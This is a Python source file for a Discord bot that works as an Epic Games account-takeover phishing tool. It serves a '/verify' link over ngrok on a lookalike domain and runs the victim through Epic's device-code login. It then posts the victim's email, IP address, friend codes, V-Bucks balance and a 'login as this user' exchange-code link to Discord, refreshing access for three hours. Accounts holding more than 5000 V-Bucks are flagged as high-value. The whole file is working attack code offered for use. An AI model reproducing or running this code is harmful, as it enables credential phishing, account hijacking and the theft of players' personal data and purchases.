#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Discord Bot for Epic Games Authentication with robust ngrok handling, 3-hour token refresh,
V-Bucks checking, and high-value account alerts.
- Last Updated: 2025-11-20 08:30:00
"""

# --- SETUP AND INSTALLATION ---
import os
import sys
import subprocess
import requests
import zipfile
import stat
import platform
import time
import logging
import asyncio
import threading
from datetime import datetime, timedelta
import http.server
import socketserver
import uuid
import traceback
import aiohttp
import discord
from discord.ext import commands

# ==============================================================================
# --- CONFIGURATION AND GLOBALS ---
# ==============================================================================

# --- Bot Configuration ---
DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN", "YOUR_DISCORD_BOT_TOKEN_HERE")
if DISCORD_BOT_TOKEN == "YOUR_DISCORD_BOT_TOKEN_HERE":
    print("FATAL: Please set the DISCORD_BOT_TOKEN environment variable.", file=sys.stderr)
    sys.exit(1)

# --- Ngrok Configuration ---
NGROK_AUTHTOKEN = os.getenv("NGROK_AUTHTOKEN")
# IMPORTANT: Using a custom domain requires a paid ngrok plan.
# The script will FALL BACK to a free URL if this fails.
NGROK_DOMAIN = "help.id-epicgames.com"

# --- Epic Games & Timings ---
EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
REFRESH_INTERVAL = 180  # 3 minutes
SESSION_DURATION = 10800 # 3 hours
VBUCKS_THRESHOLD = 5000

# --- Channel Names ---
MAIN_CHANNEL_NAME = "epic-auth-system"
HIGH_VALUE_CHANNEL_NAME = "high-value-accounts"

# --- Logging ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("epic_auth_bot")

# --- Globals ---
intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True # Enabling Message Content Intent
bot = commands.Bot(command_prefix="!", intents=intents)

ngrok_ready = threading.Event()
verification_link = None

active_sessions = {}
session_lock = threading.Lock()

# ==============================================================================
# --- NGROK AND WEB SERVER ---
# ==============================================================================

def run_setup():
    """Ensures ngrok is installed and configured."""
    # (Setup code remains the same as previous version)
    print("--- Starting initial setup ---")
    ngrok_path = os.path.join(os.getcwd(), "ngrok")
    if not os.path.exists(ngrok_path):
        try:
            print("1/2: Downloading and installing ngrok...")
            machine, system = platform.machine().lower(), platform.system().lower()
            ngrok_url = f"https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-{system}-{machine}.zip"
            if system == "linux":
                ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
                if "aarch64" in machine or "arm64" in machine:
                    ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip"

            with requests.get(ngrok_url, stream=True) as r:
                r.raise_for_status()
                with open("ngrok.zip", "wb") as f:
                    for chunk in r.iter_content(chunk_size=8192): f.write(chunk)
            
            with zipfile.ZipFile("ngrok.zip", "r") as zip_ref: zip_ref.extractall(".")
            os.remove("ngrok.zip")
            os.chmod(ngrok_path, os.stat(ngrok_path).st_mode | stat.S_IEXEC)
            print("     ngrok installed successfully.")
        except Exception as e:
            print(f"     ERROR: Failed to download or set up ngrok: {e}", file=sys.stderr)
            sys.exit(1)
    else:
        print("1/2: ngrok is already installed.")

    if NGROK_AUTHTOKEN:
        try:
            print("2/2: Configuring ngrok authtoken...")
            subprocess.check_call([ngrok_path, "config", "add-authtoken", NGROK_AUTHTOKEN], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("     ngrok authtoken configured.")
        except Exception as e:
            print(f"     WARNING: Failed to configure ngrok authtoken: {e}", file=sys.stderr)
    else:
        print("2/2: NGROK_AUTHTOKEN not set, skipping configuration.")
    print("--- Setup complete ---")


class RequestHandler(http.server.SimpleHTTPRequestHandler):
    # (RequestHandler code remains the same as previous version)
    def do_GET(self):
        if self.path == '/verify':
            client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            logger.info(f"\n[VERIFY] 🌐 New verification request from IP: {client_ip}")
            
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                epic_session = loop.run_until_complete(create_epic_auth_session())
                
                threading.Thread(
                    target=monitor_epic_auth_sync,
                    args=(epic_session['device_code'], epic_session['interval'], epic_session['expires_in'], client_ip),
                    daemon=True
                ).start()
                
                self.send_response(302)
                self.send_header('Location', epic_session['activation_url'])
                self.end_headers()
            except Exception as e:
                logger.error(f"❌ Error during auth session creation: {e}\n{traceback.format_exc()}")
                self.send_error(500)
        else:
            self.send_error(404)

    def log_message(self, format, *args):
        pass # Suppress HTTP logs

def run_web_server(port):
    with socketserver.ThreadingTCPServer(("", port), RequestHandler) as httpd:
        logger.info(f"🚀 Web server starting on port {port}")
        httpd.serve_forever()

def setup_ngrok_tunnel(port):
    """Starts an ngrok tunnel, attempting custom domain and falling back to a free one."""
    global verification_link
    ngrok_executable = os.path.join(os.getcwd(), "ngrok")
    
    # Try to start with custom domain first (requires paid plan)
    if NGROK_AUTHTOKEN and NGROK_DOMAIN:
        logger.info(f"🌐 Attempting to start ngrok tunnel with custom domain: {NGROK_DOMAIN}...")
        command = [ngrok_executable, 'http', str(port), f'--domain={NGROK_DOMAIN}']
        subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        logger.info("🌐 Starting ngrok tunnel with a free random domain...")
        command = [ngrok_executable, 'http', str(port)]
        subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Poll ngrok API to get the public URL
    public_url = None
    for i in range(8): # Poll for up to 20 seconds
        time.sleep(2.5)
        try:
            with requests.get('http://127.0.0.1:4040/api/tunnels', timeout=2) as r:
                r.raise_for_status()
                tunnels = r.json().get('tunnels', [])
                if tunnels:
                    # Prefer the custom domain if it's active
                    custom_tunnel = next((t for t in tunnels if NGROK_DOMAIN in t.get('public_url', '')), None)
                    if custom_tunnel:
                        public_url = custom_tunnel['public_url']
                        logger.info(f"✅ Successfully using custom domain: {public_url}")
                    else: # Fallback to the first available HTTPS tunnel
                        public_url = tunnels[0]['public_url']
                        logger.warning(f"⚠️  Custom domain failed. Falling back to free URL: {public_url}")
                    break
        except requests.ConnectionError:
            logger.info(f"ngrok API not ready, retrying... (Attempt {i+1})")
            continue
    
    if public_url:
        verification_link = f"{public_url}/verify"
        logger.info(f"🔗 Verification Link is LIVE: {verification_link}")
        ngrok_ready.set()
    else:
        logger.critical("❌ Ngrok failed to start or create a tunnel after 20 seconds.")
        sys.exit(1)


# ==============================================================================
# --- EPIC GAMES API & DISCORD LOGIC (remains the same) ---
# ==============================================================================
async def create_epic_auth_session():
    """Creates a new device authorization session with Epic Games."""
    headers = {
        "Authorization": f"basic {EPIC_TOKEN}",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    async with aiohttp.ClientSession() as sess:
        # Get client credentials token
        async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers=headers, data={"grant_type": "client_credentials"}) as r:
            r.raise_for_status()
            token_data = await r.json()
        
        # Get device authorization details
        auth_headers = {
            "Authorization": f"bearer {token_data['access_token']}",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        async with sess.post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/deviceAuthorization", headers=auth_headers) as r:
            r.raise_for_status()
            dev_auth = await r.json()
            
    return {
        'activation_url': f"https://www.epicgames.com/id/activate?userCode={dev_auth['user_code']}",
        'device_code': dev_auth['device_code'],
        'interval': dev_auth.get('interval', 5),
        'expires_in': dev_auth.get('expires_in', 600)
    }

async def get_exchange_code(access_token):
    """Uses an access_token to get a new exchange code."""
    try:
        async with aiohttp.ClientSession() as sess:
            headers = {"Authorization": f"bearer {access_token}"}
            async with sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers=headers) as r:
                if r.status == 200:
                    return (await r.json())['code']
                else:
                    logger.warning(f"Failed to get exchange code, status {r.status}: {await r.text()}")
                    return None
    except Exception as e:
        logger.error(f"❌ Exception while getting exchange code: {e}")
        return None

async def get_stw_codes(access_token, account_id):
    """Fetches Save The World friend codes."""
    logger.info(f"[{account_id[:8]}] Fetching STW friend codes...")
    platforms = ['epic', 'xbox']
    all_codes = []
    headers = {"Authorization": f"Bearer {access_token}"}
    
    async with aiohttp.ClientSession() as sess:
        for platform in platforms:
            url = f"https://fngw-mcp-gc-livefn.ol.epicgames.com/fortnite/api/game/v2/friendcodes/{account_id}/{platform}"
            try:
                async with sess.get(url, headers=headers) as r:
                    if r.status == 200 and (codes := await r.json()):
                        logger.info(f"[{account_id[:8]}] Found {len(codes)} code(s) for {platform.upper()}")
                        all_codes.extend([f"{platform.upper()}: `{code['codeId']}`" for code in codes])
            except Exception as e:
                logger.error(f"[{account_id[:8]}] Exception fetching STW codes for {platform.upper()}: {e}")
    return all_codes

async def get_vbucks_balance(access_token, account_id):
    """Fetches the V-Bucks balance for a given account."""
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=common_core"
    
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.post(url, headers=headers, json={}) as r:
                if r.status == 200:
                    profile_data = await r.json()
                    for item in profile_data.get('profileChanges', [{}])[0].get('profile', {}).get('items', {}).values():
                        if 'Currency:Mtx' in item.get('templateId', ''):
                            vbucks = item.get('quantity', 0)
                            logger.info(f"[{account_id[:8]}] Found V-Bucks balance: {vbucks}")
                            return vbucks
    except Exception as e:
        logger.error(f"[{account_id[:8]}] Error fetching V-Bucks: {e}")
        return 0
    return 0

async def get_or_create_channel(guild, channel_name):
    """Gets or creates a text channel in a guild."""
    for channel in guild.text_channels:
        if channel.name == channel_name:
            return channel
    try:
        return await guild.create_text_channel(channel_name)
    except discord.Forbidden:
        logger.error(f"Failed to create channel '{channel_name}' in guild '{guild.name}'. Missing permissions.")
        return None

@bot.event
async def on_guild_join(guild):
    """Handle the bot joining a new server."""
    logger.info(f"Joined new guild: {guild.name} (ID: {guild.id})")
    await get_or_create_channel(guild, MAIN_CHANNEL_NAME)
    await get_or_create_channel(guild, HIGH_VALUE_CHANNEL_NAME)

@bot.event
async def on_ready():
    """Called when the bot is ready and connected to Discord."""
    print(f'Logged in as {bot.user.name}')
    print("=" * 60)
    
    # Ensure channels exist in all guilds and send startup message
    for guild in bot.guilds:
        main_channel = await get_or_create_channel(guild, MAIN_CHANNEL_NAME)
        await get_or_create_channel(guild, HIGH_VALUE_CHANNEL_NAME)
        
        if main_channel and verification_link and not bot.is_closed():
            embed = discord.Embed(
                title="🚀 Epic Auth System Online",
                description=f"System is ready for verifications.\n\n🔗 **Verification Link:**\n`{verification_link}`",
                color=discord.Color.blue()
            )
            try:
                await main_channel.send(embed=embed)
            except discord.Forbidden:
                logger.error(f"Could not send startup message to {guild.name}. Missing permissions.")
    
    print(f"✅ Bot is ready and channels are configured in {len(bot.guilds)} guild(s).")
    print("=" * 60)


async def send_login_success_embed(session_id, account_info, exchange_code, user_ip, stw_codes, vbucks):
    """Sends and stores the initial login success message."""
    display_name = account_info.get('displayName', 'N/A')
    account_id = account_info.get('id', 'N/A')
    
    embed = build_user_embed(
        session_id, account_info, exchange_code, user_ip, 
        stw_codes, vbucks, 0, is_initial=True
    )
    
    for guild in bot.guilds:
        channel = await get_or_create_channel(guild, MAIN_CHANNEL_NAME)
        if channel:
            message = await channel.send(embed=embed)
            with session_lock:
                if session_id in active_sessions:
                    active_sessions[session_id]['message_ids'][guild.id] = message.id

async def update_login_message(session_id, account_info, exchange_code, user_ip, stw_codes, vbucks, refresh_count):
    """Edits the existing login message with refreshed data."""
    embed = build_user_embed(
        session_id, account_info, exchange_code, user_ip,
        stw_codes, vbucks, refresh_count, is_initial=False
    )

    with session_lock:
        session = active_sessions.get(session_id)
        if not session: return
        message_ids = session['message_ids']

    for guild_id, message_id in message_ids.items():
        guild = bot.get_guild(guild_id)
        if guild:
            channel = await get_or_create_channel(guild, MAIN_CHANNEL_NAME)
            if channel:
                try:
                    message = await channel.fetch_message(message_id)
                    await message.edit(embed=embed)
                except discord.NotFound:
                    logger.warning(f"Message {message_id} not found in guild {guild.name}. It may have been deleted.")
                    # Re-send if deleted
                    new_message = await channel.send(embed=embed)
                    with session_lock:
                         if session_id in active_sessions:
                            active_sessions[session_id]['message_ids'][guild.id] = new_message.id
                except discord.Forbidden:
                    logger.error(f"Missing permissions to edit message in {guild.name}.")


def build_user_embed(session_id, account_info, exchange_code, user_ip, stw_codes, vbucks, refresh_count, is_initial):
    """Helper function to build the consistent embed for users."""
    display_name = account_info.get('displayName', 'N/A')
    email = account_info.get('email', 'N/A')
    account_id = account_info.get('id', 'N/A')
    login_link = f"https://www.epicgames.com/id/exchange?exchangeCode={exchange_code}&redirectUrl=https%3A%2F%2Flauncher.store.epicgames.com%2Fsite%2Faccount"
    
    title = "✅ User Logged In Successfully" if is_initial else "🔄 User Session Refreshed"
    description = f"**{display_name}** has completed verification." if is_initial else f"Session for **{display_name}** has been updated."
    
    embed = discord.Embed(title=title, description=description, color=discord.Color.green())
    
    embed.add_field(name="Display Name", value=display_name, inline=True)
    embed.add_field(name="Email", value=email, inline=True)
    embed.add_field(name="V-Bucks", value=f"**{vbucks}** 💸" if vbucks > 0 else "Not found", inline=True)
    embed.add_field(name="Account ID", value=f"`{account_id}`", inline=False)
    embed.add_field(name="IP Address", value=f"`{user_ip}`", inline=False)
    
    if stw_codes:
        embed.add_field(name="🔑 Save The World Codes", value="\n".join(stw_codes), inline=False)

    embed.add_field(name="🔗 Direct Login Link", value=f"**[Click to login as this user]({login_link})**", inline=False)
    embed.add_field(name="Exchange Code", value=f"```{exchange_code}```", inline=False)

    session_expiry = datetime.utcnow() + timedelta(seconds=SESSION_DURATION - (time.time() - active_sessions[session_id]['created_at']))
    embed.set_footer(text=f"Session ID: {session_id} | Refresh #{refresh_count} | Expires: {session_expiry.strftime('%H:%M:%S UTC')}")
    embed.timestamp = datetime.utcnow()
    
    return embed


async def manage_high_value_account(account_info, vbucks, access_token):
    """Manages the process for a high-value account."""
    account_id = account_info.get('id', 'N/A')
    display_name = account_info.get('displayName', 'N/A')
    logger.info(f"[{account_id[:8]}] High-value account detected: {display_name} with {vbucks} V-Bucks.")

    # Create a persistent authorization session
    auth_session = await create_epic_auth_session()
    
    embed = discord.Embed(
        title="🚨 High-Value Account Detected!",
        description=f"**{display_name}** has more than {VBUCKS_THRESHOLD} V-Bucks.",
        color=discord.Color.gold()
    )
    embed.add_field(name="Display Name", value=display_name, inline=True)
    embed.add_field(name="V-Bucks Balance", value=f"**{vbucks}** 💸", inline=True)
    embed.add_field(name="Account ID", value=f"`{account_id}`", inline=False)
    embed.add_field(name="🔴 Persistent Login Link", value=f"[Activate Login]({auth_session['activation_url']})", inline=False)
    embed.set_footer(text=f"This is a persistent authorization link. It will stay active.")
    embed.timestamp = datetime.utcnow()
    
    message_references = {}
    for guild in bot.guilds:
        channel = await get_or_create_channel(guild, HIGH_VALUE_CHANNEL_NAME)
        if channel:
            message = await channel.send(embed=embed)
            message_references[guild.id] = message.id

    logger.info(f"[{account_id[:8]}] Posted high-value alert to {len(message_references)} guild(s).")

def monitor_epic_auth_sync(device_code, interval, expires_in, user_ip):
    """Synchronous wrapper to run the async monitoring task."""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(monitor_epic_auth(device_code, interval, expires_in, user_ip))
    finally:
        loop.close()

async def monitor_epic_auth(device_code, interval, expires_in, user_ip):
    """Monitors the Epic Games device authentication flow for completion."""
    device_id = device_code[:8]
    logger.info(f"[{device_id}] 👁️  Monitoring Epic auth...")
    
    async with aiohttp.ClientSession() as sess:
        deadline = time.time() + expires_in
        while time.time() < deadline:
            await asyncio.sleep(interval)
            data = {"grant_type": "device_code", "device_code": device_code}
            headers = {"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}
            
            async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers=headers, data=data) as r:
                if r.status != 200: continue
                
                token_resp = await r.json()
                if "access_token" in token_resp:
                    logger.info(f"[{device_id}] ✅ USER LOGGED IN!")
                    access_token = token_resp['access_token']
                    account_id = token_resp['account_id']
                    
                    # Fetch account details
                    auth_headers = {"Authorization": f"bearer {access_token}"}
                    async with sess.get(f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{account_id}", headers=auth_headers) as r3:
                        account_info = await r3.json()
                    
                    # Get initial exchange code
                    exchange_code = await get_exchange_code(access_token)
                    if not exchange_code:
                        logger.error(f"[{account_id[:8]}] Failed to get initial exchange code. Aborting session.")
                        return

                    # Fetch STW codes and V-Bucks
                    stw_codes = await get_stw_codes(access_token, account_id)
                    vbucks = 0
                    if not stw_codes:
                        vbucks = await get_vbucks_balance(access_token, account_id)

                    session_id = str(uuid.uuid4())[:8]
                    with session_lock:
                        active_sessions[session_id] = {
                            'access_token': access_token,
                            'account_info': account_info,
                            'user_ip': user_ip,
                            'created_at': time.time(),
                            'expires_at': time.time() + SESSION_DURATION,
                            'stw_codes': stw_codes,
                            'vbucks': vbucks,
                            'message_ids': {}, # {guild_id: message_id}
                            'refresh_count': 0
                        }
                    
                    # Schedule tasks in the main bot event loop
                    asyncio.run_coroutine_threadsafe(send_login_success_embed(session_id, account_info, exchange_code, user_ip, stw_codes, vbucks), bot.loop)
                    asyncio.run_coroutine_threadsafe(auto_refresh_session(session_id), bot.loop)
                    
                    if vbucks > VBUCKS_THRESHOLD:
                         asyncio.run_coroutine_threadsafe(manage_high_value_account(account_info, vbucks, access_token), bot.loop)

                    return

async def auto_refresh_session(session_id):
    """Refreshes the exchange code for the session's lifetime and updates the Discord message."""
    try:
        with session_lock:
            session = active_sessions.get(session_id)
            if not session: return
            display_name = session['account_info'].get('displayName', 'Unknown')
            session_expiry_time = session['expires_at']

        logger.info(f"[{session_id}] 🔄 Auto-refresh task STARTED for {display_name}. Will run for approx. 3 hours.")

        while time.time() < session_expiry_time:
            await asyncio.sleep(REFRESH_INTERVAL)
            
            with session_lock:
                session = active_sessions.get(session_id)
                if not session:
                    logger.info(f"[{session_id}] ⏹️ Session removed; stopping auto-refresh for {display_name}.")
                    break
                current_access_token = session['access_token']

            new_exchange_code = await get_exchange_code(current_access_token)

            if new_exchange_code:
                with session_lock:
                    session = active_sessions.get(session_id)
                    if not session: break
                    session['refresh_count'] += 1
                    refresh_count = session['refresh_count']
                
                logger.info(f"[{session_id}] ✅ Exchange code REFRESHED for {display_name} (Refresh #{refresh_count})")
                await update_login_message(
                    session_id, session['account_info'], new_exchange_code, session['user_ip'],
                    session['stw_codes'], session['vbucks'], refresh_count
                )
            else:
                logger.warning(f"[{session_id}] Exchange code refresh failed for {display_name}. Will retry.")

    except asyncio.CancelledError:
        logger.info(f"[{session_id}] ⏹️ Auto-refresh task was cancelled for {display_name}")
    finally:
        with session_lock:
            session_info = active_sessions.pop(session_id, None)
            display_name = session_info['account_info'].get('displayName', 'Unknown') if session_info else 'Unknown'
        logger.info(f"[{session_id}] 🔚 Auto-refresh task ENDED for {display_name}.")

# ==============================================================================
# --- APPLICATION STARTUP ---
# ==============================================================================

def main():
    """Main function to orchestrate startup."""
    run_setup()

    # Start the web server and ngrok in separate threads
    threading.Thread(target=run_web_server, args=(8000,), daemon=True).start()
    threading.Thread(target=setup_ngrok_tunnel, args=(8000,), daemon=True).start()

    logger.info("Waiting for ngrok to initialize...")
    if not ngrok_ready.wait(timeout=25):
        logger.critical("❌ Timed out waiting for ngrok. Please check your network and ngrok status.")
        sys.exit(1)
    
    # Start the bot
    if DISCORD_BOT_TOKEN == "YOUR_DISCORD_BOT_TOKEN_HERE":
        logger.critical("FATAL: DISCORD_BOT_TOKEN is not set.")
        return
        
    try:
        bot.run(DISCORD_BOT_TOKEN)
    except discord.LoginFailure:
        logger.critical("FATAL: Failed to log in. Please check your DISCORD_BOT_TOKEN.")
    except Exception as e:
        logger.critical(f"FATAL: An error occurred while running the bot: {e}")

if __name__ == "__main__":
    main()
